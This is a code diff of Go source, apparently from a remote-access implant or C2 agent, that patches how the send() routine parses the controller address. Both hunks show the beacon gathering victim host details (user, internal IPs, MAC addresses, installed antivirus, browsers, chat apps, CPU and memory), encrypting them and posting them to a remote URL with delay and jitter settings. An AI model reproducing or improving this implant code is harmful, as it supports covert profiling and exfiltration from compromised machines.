@@ -339,7 +339,7 @@ func send() { //发送头部信息
     currentDir = strings.ReplaceAll(currentDir, "\\", "/")
     parts := strings.Split(master, ":")
 	executable, _ := os.Executable()
-    add_str := clientname +"*//*"+ user +"*//*"+ osname +"*//*"+ strconv.Itoa(int(delay)) +"*//*"+ getInternalIPs() +"*//*"+ currentDir +"*//*"+ version +"*//*"+ parts[1] +"*//*"+ protocol +"*//*"+ strconv.Itoa(int(jitter))+"*//*"+ executable +"*//*"+ macs +"*//*"+ cpuInfo +"*//*"+ Antivirus +"*//*"+ Browsers +"*//*"+ ChatApps +"*//*"+ memoryStr +"*//*"+ systemType +"*//*"+ Arm
+    add_str := clientname +"*//*"+ user +"*//*"+ osname +"*//*"+ strconv.Itoa(int(delay)) +"*//*"+ getInternalIPs() +"*//*"+ currentDir +"*//*"+ version +"*//*"+ parts[len(parts)-1] +"*//*"+ protocol +"*//*"+ strconv.Itoa(int(jitter))+"*//*"+ executable +"*//*"+ macs +"*//*"+ cpuInfo +"*//*"+ Antivirus +"*//*"+ Browsers +"*//*"+ ChatApps +"*//*"+ memoryStr +"*//*"+ systemType +"*//*"+ Arm
     encry_str := get_encry_s(&add_str)
     data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
     post(data, re_url)
@@ -353,7 +353,7 @@ func send() { //发送头部信息
             currentDir = strings.ReplaceAll(currentDir, "\\", "/")
             parts := strings.Split(master, ":")
 			executable, _ := os.Executable()
-            add_str := clientname +"*//*"+ user +"*//*"+ osname +"*//*"+ strconv.Itoa(int(delay)) +"*//*"+ getInternalIPs() +"*//*"+ currentDir +"*//*"+ version +"*//*"+ parts[1] +"*//*"+ protocol +"*//*"+ strconv.Itoa(int(jitter))+"*//*"+ executable
+            add_str := clientname +"*//*"+ user +"*//*"+ osname +"*//*"+ strconv.Itoa(int(delay)) +"*//*"+ getInternalIPs() +"*//*"+ currentDir +"*//*"+ version +"*//*"+ parts[len(parts)-1] +"*//*"+ protocol +"*//*"+ strconv.Itoa(int(jitter))+"*//*"+ executable
             encry_str := get_encry_s(&add_str)
             data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
             post(data, re_url)
